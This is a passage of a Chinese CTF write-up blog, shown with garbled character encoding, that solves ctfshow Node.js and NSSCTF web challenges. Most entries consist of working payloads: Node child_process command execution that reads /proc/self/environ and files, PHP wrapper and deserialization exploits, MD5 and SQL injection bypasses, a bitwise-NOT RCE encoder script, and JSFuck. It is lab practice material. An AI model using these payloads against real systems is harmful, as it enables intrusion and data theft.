spawnSync(&#39;sleep&#39;, [&#39;3&#39;]) è€Œæ²¡æœ‰å°†å…¶ç»“æœèµ‹å€¼ç»™ä¸€ä¸ªå˜é‡æ—¶ï¼ŒNode.js ä»ç„¶ä¼šæ‰§è¡Œ sleep å‘½ä»¤å¹¶ç­‰å¾… 3 ç§’ï¼Œä½†ä½ ä¸ä¼šçœ‹åˆ°ä»»ä½•è¾“å‡ºæˆ–ç»“æœï¼Œå› ä¸ºä½ æ²¡æœ‰å¤„ç†è¿™ä¸ªè¿”å›çš„å¯¹è±¡\nrequire(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();\n\næŠŠç»“æœè¾“å‡ºå³å¯\nre = 0s = &quot;require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&quot;print(s.__len__())print(&quot;&amp;calc[]=1&quot;*s.__len__())\n\ncalc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.\n\n\nå°è¯•cat &#x2F;G*,å‘ç°æ²¡æœ‰å›æ˜¾,å°†è¿™ä¸ªæ–‡ä»¶å†™å…¥é™æ€æ–‡ä»¶aä¸­\ncalc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&gt;a&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.\n\nåˆ©ç”¨require(&#39;child_process&#39;).spawnSync(&#39;nl&#39;,[&#39;a&#39;]).stdout.toString();è¯»æ–‡ä»¶\ncalc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;a&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.\n\n\nNSSCTF&#123;d7a0ce62-0588-468d-962b-82dc93a05c02&#125;\n\nctfshow-335æ§åˆ¶å°å‘ç°æç¤º?eval,ç›´æ¥è¯»ç¯å¢ƒå˜é‡\n?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;/proc/self/environ&#x27;]).stdout.toString();\n\n\nctfshow&#123;4b42b419-0ed2-4aa5-8be3-9c65286d76e1&#125;\n\nctfshow-337var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  \tres.end(flag);  &#125;else&#123;  \tres.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;\n\nåˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼š\n?a[]=1&amp;b[]=1\n\n\nctfshow&#123;659a8987-8805-4f75-886b-ce2cad9136aa&#125;\n\n","categories":["node.js"],"tags":["node.js å‘½ä»¤æ‰§è¡Œ"]},{"title":"nssctfå†™é¢˜æ—¥è®°","url":"/2025/09/10/nssctf/","content":"nssctf[ç¬¬äº”ç©ºé—´ 2021]WebFTPæ‰«ç›®å½•å¾—åˆ°.gitæ–‡ä»¶,å‘ç°å­˜åœ¨configæ–‡ä»¶å¤¹,å‘ç°å­˜åœ¨phpinfo.php,è®¿é—®å¾—åˆ°flag\n\n\nNSSCTF&#123;523bbf70-90f8-4d24-b698-afe62065324a&#125;\n\n[LitCTF 2023]PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼å³è¾¹å†™rceå°±è¡Œ\nNSSCTF&#123;6b69b03c-cc50-409c-b3a8-7221eb6968dc&#125;\n\n[LitCTF 2023]æˆ‘Flagå‘¢ï¼Ÿ\n\nNSSCTF&#123;9fbe5ec2-8489-45a5-95c3-7d812b136061&#125;\n\n[SWPUCTF 2021 ]caidao\nèšå‰‘å°±è¡Œ,flagåœ¨æ ¹ç›®å½•\n\nNSSCTF&#123;dd5ca420-ef4b-4dca-9282-cba263ab6772&#125;\n\n[SWPUCTF 2021 ]Do_you_know_http\næ”¹uaå¤´ä¸ºWLLMå³å¯,åˆ°ä¸‹ä¸€å…³\n\næ”¹refererä¸º127.0.0.1å³å¯,è¯•äº†ä¸è¡Œ,æ”¹xffä¸º127.0.0.1å°±è¡Œäº†\n\nNSSCTF&#123;5fc1788d-4c64-4643-bd36-730437e76d6a&#125;\n\n[SWPUCTF 2021 ]easyupload2.0ä¼ phtmlå³å¯,ä¸æµªè´¹æ—¶é—´\n\nNSSCTF&#123;ad299558-a3d9-43da-b700-095613e9fcf4&#125;\n\n[SWPUCTF 2021 ]easyupload1.0æŠ“åŒ…æ”¹mimeä¸ºimage&#x2F;jpegå³å¯\n\nWLLMCTF&#123;I_d0nt_w4nna_wak3up&#125;\n\nflagåœ¨ç¯å¢ƒå˜é‡é‡Œ\n\nNSSCTF&#123;9043613f-14aa-42f3-b33f-83e1dce3c0e9&#125;\n\n[LitCTF 2023]å¯¼å¼¹è¿·è¸ªå‘ç°æœ‰game.js,æ‰“å¼€å³å¾—flag\n\n\nNSSCTF&#123;y0u_w1n_th1s_!!!&#125;\n\n[SWPUCTF 2021 ]PseudoProtocolshint is hear Can you find out the hint.php?\nhttp://node7.anna.nssctf.cn:29272/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php\n\nå¾—åˆ°\nPD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=&lt;?php//go to /test2222222222222.php?&gt;\n\nè®¿é—®å¾—åˆ°\n&lt;?phpini_set(&quot;max_execution_time&quot;, &quot;180&quot;);show_source(__FILE__);include(&#x27;flag.php&#x27;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;    echo &quot;success\\n&quot;;    echo $flag;&#125;?&gt;\n\nphp:&#x2F;&#x2F;inputå†™å…¥ I want flagå¾—åˆ°flag\n\næˆ–è€…ä½¿ç”¨\n?a=data://text/plain,I want flag\n\nNSSCTF&#123;00bca5ac-7378-4d18-b083-fd2cc0875472&#125;\n\n[SWPUCTF 2021 ]no_wakeup&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;user&quot;;            $this-&gt;passwd = &quot;123456&quot;;        &#125;        public function __wakeup()&#123;            $this-&gt;passwd = sha1($this-&gt;passwd);        &#125;        public function __destruct()&#123;            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;                include(&quot;flag.php&quot;);                echo $flag;            &#125;else&#123;                echo $this-&gt;passwd;                echo &quot;No wake up&quot;;            &#125;        &#125;    &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt;\n\nåºåˆ—åŒ–å­—ç¬¦ä¸²æ”¹ä¸€ä¸‹å¯¹è±¡å±æ€§ä¸ªæ•°å°±è¡Œ\n&lt;?phpclass HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;admin&quot;;            $this-&gt;passwd = &quot;wllm&quot;;        &#125;    &#125;$a = new HaHaHa();echo serialize($a);?&gt;\n\nO:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; //åŸæ¥æ˜¯2æ”¹ä¸º3\n\n\nNSSCTF&#123;5efb832a-30a5-478a-ba1b-6dacd265090d&#125;\n\n[LitCTF 2023]Follow me and hack me\n\nNSSCTF&#123;f3140228-a555-4eec-aac2-5eab8d9127d0&#125;\n\n[NCTF 2018]ç­¾åˆ°é¢˜æŠ“index.phpæŸ¥çœ‹è¿”å›åŒ…å³å¯\n\nflag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125;\n\n[LitCTF 2023]Pingping127.0.0.1ç„¶åæŠ“åŒ…,åœ¨commandååŠ ç®¡é“ç¬¦\n\n\n\nNSSCTF&#123;79672859-7f29-4f87-b82f-376d9f270e9d&#125;\n\n14.[SWPUCTF 2021 ]hardrce&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123;    $wllm = $_GET[&#x27;wllm&#x27;];    $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,];    foreach ($blacklist as $blackitem)    &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;        die(&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;);    &#125;&#125;if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))&#123;    die(&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;);&#125;echo &quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;;eval($wllm);&#125;else&#123;    echo &quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;;&#125;?&gt;\n\nä½¿ç”¨å–åè„šæœ¬\n#!/usr/bin/env python# -*- coding: UTF-8 -*-&quot;&quot;&quot;@Project :PythonProject @File    ï¼šå–åè„šæœ¬.py@IDE     :PyCharm @Author  :DY19sec@Date    :2025/4/20 13:12 &quot;&quot;&quot;import urllib.parse as urlparse# è·å–ç”¨æˆ·è¾“å…¥çš„å‡½æ•°åå’Œå‘½ä»¤system = input(&#x27;[+]your function: &#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)command = input(&#x27;[+]your command: &#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)# æŒ‰ä½å–åå¹¶è½¬æ¢ä¸ºå­—èŠ‚def invert_to_bytes(s):    return bytes([(~ord(c)) &amp; 0xFF for c in s])# ç”ŸæˆURLç¼–ç åçš„å­—ç¬¦ä¸²encoded_system = urlparse.quote(invert_to_bytes(system))encoded_command = urlparse.quote(invert_to_bytes(command))# è¾“å‡ºæœ€ç»ˆç»“æœprint(f&#x27;[*] (~&#123;encoded_system&#125;)(~&#123;encoded_command&#125;);&#x27;)\n\n\n\nNSSCTF&#123;59931241-37d1-4c25-b575-0c04d47feb6c&#125;\n\n[BJDCTF 2020]easy_md5\næŠ“åŒ…å¾—åˆ°ä¿¡æ¯\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\næ­¤å¤„ä½¿ç”¨ffifdyopä¸‡èƒ½å¯†ç ç»•è¿‡ã€‚ffifdyopçš„MD5åŠ å¯†ç»“æœæ˜¯276f722736c95d99e921722cf9ed621cï¼Œç»è¿‡MySQLç¼–ç åä¼šå˜æˆâ€™orâ€™6xxx,ä½¿SQLæ’æˆç«‹,ç›¸å½“äºä¸‡èƒ½å¯†ç ,å¯ä»¥ç»•è¿‡md5()å‡½æ•°çš„åŠ å¯†\nè¿›å…¥ä¸‹ä¸€å…³,æºç å¾—åˆ°hint\n$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    header(&#x27;Location: levell14.php&#x27;);\n\nQNKCDZO240610708s878926199as155964671as214587387as214587387aæŒ‘ä¸¤ä¸ªä¸Šå»\n\nä¸‹ä¸€å…³:\n&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;    echo $flag;&#125;\n\næ•°ç»„ç»•è¿‡\nparam1[]=1&amp;param2[]=2\n\n\nNSSCTF&#123;e6cd9dd7-f3ea-4215-bac8-6078fb8a7116&#125;\n\n[NSSCTF 2022 Spring Recruit]ezgameå‰ç«¯æœ‰ä¸€ä¸ªpreload.jsçœ‹çœ‹\n\nNSSCTF&#123;db5bc963-8bca-4c4c-b3ad-4bf678761cde&#125;\n\n[suctf 2019]EasySQLæ‰‹åŠ¨fuzz,ä¸€èˆ¬çš„è”åˆæ³¨å…¥,æŠ¥é”™æ³¨å…¥éƒ½æ²¡æœ‰ç”¨,å°è¯•ä¸€ä¸‹å †å æ³¨å…¥å‘ç°å¯è¡Œ,version();1æ­£å¸¸å›æ˜¾\n*,1\n\n\nNSSCTF&#123;fe616752-38e6-48b7-bf05-bae4207c9eb9&#125;\n\n[GXYCTF 2019]Ping Ping Ping[SWPUCTF 2022 ]ez_ez_php&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;        echo &quot;Nice!!!&quot;;        include($_GET[&quot;file&quot;]);    &#125;     else &#123;        echo &quot;Hacker!!&quot;;    &#125;&#125;else &#123;    highlight_file(__FILE__);&#125;//flag.php\n\n?file=php://filter/resource=flag.php\n\nå›æ˜¾å¦‚ä¸‹:\nNice!!!NSSCTF&#123;flag_is_not_here&#125;real_flag_is_in_&#x27;flag&#x27;é¹î­é‡œé¬æ¿ŠçŸ¾é”›å²ƒç˜¯ç’‡æ˜‰HPæµ¼î„å´—ç’î†¼æ†¿\n\n\nNSSCTF&#123;224ead8f-72ef-4e59-8eca-c6955d7b4d2a&#125;\n\n[ZJCTF 2019]NiZhuanSiWei&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\nè¿™ä¸ªå…ˆç”¨php:&#x2F;&#x2F;inputå†™å…¥å³å¯,ç„¶åå†è¯»useless.phpçš„å†…å®¹\n?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.phpPOSTwelcome to zjctf\n\n\nè§£ç å¾—åˆ°\n&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;$password = unserialize($password);echo $password;?&gt;  \n\nå·²ç»æœ‰echo,tostringè‡ªå·±ä¼šè§¦å‘\nO:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n\nNSSCTF&#123;2186140d-c1a9-463c-bdc3-03cf2f56d9a3&#125;\n\n[SWPUCTF 2021 ]errorsqlmapä¸€æŠŠæ¢­\n\nNSSCTF&#123;8134250c-a5ad-4f6a-baab-54b780be6ecd&#125;\n\n[SWPUCTF 2021 ]easyupload3.0\nå‘ç°ä¸­é—´ä»¶æ˜¯Apache,å…ˆä¼ .htaccess,ç„¶åä¼ 1.jpgå³å¯\n\nNSSCTF&#123;66aab468-488d-440f-915f-617037679ca9&#125;\n\n[LitCTF 2023]1zjs\nçœ‹è¿™ä¸ªjsæ–‡ä»¶å’Œphpæ–‡ä»¶\n(+[![]]+[])[+[]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[